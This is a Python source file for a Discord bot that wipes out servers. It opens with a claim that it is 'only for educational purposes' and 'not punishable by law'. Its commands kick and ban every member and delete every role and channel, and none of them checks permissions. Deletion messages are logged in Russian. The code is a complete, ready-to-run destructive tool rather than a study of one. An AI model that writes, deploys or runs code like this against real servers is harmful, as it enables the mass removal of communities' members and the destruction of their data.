import discord
from discord.ext import commands

#THIS BOT WAS CREATED ONLY FOR EDUCATIONAL PURPOSES,
# ANY USE THEREOF IS NOT PUNISHABLE BY LAW

#classic_start
intents = discord.Intents.all()
intents.message_content = True
bot = commands.Bot(command_prefix='$', intents=intents)

#bot_ready_towork
@bot.event
async def on_ready():
     while True:
          await bot.change_presence(status=discord.Status.online, activity=discord.Game("ZE WARUDO OVER HEAVEN!"))

#kickallusers
@bot.command()
async def kickall(ctx):
    for i in ctx.guild.members:
        try:
            await i.kick(reason="По просьбе")
        except:
            pass

#ban all users
@bot.command()
async def ban(ctx):
    for i in ctx.guild.members:
        try:
            await i.ban(reason="По просьбе")
        except:
            pass

#delete_allroles
@bot.command()
async def delrole(ctx):
    for i in ctx.guild.roles:
        try:
            await i.delete(reason="По просьбе")
        except:
            pass

#delete_all_channels
@bot.command()
async def delchannel(ctx):
    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete(reason="По просьбе")
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)
    await ctx.send(f"Удалено {counter} каналов. {f'Не удалил: {fmt}' if len(failed) > 0 else ''}")


#token
bot.run('your token')


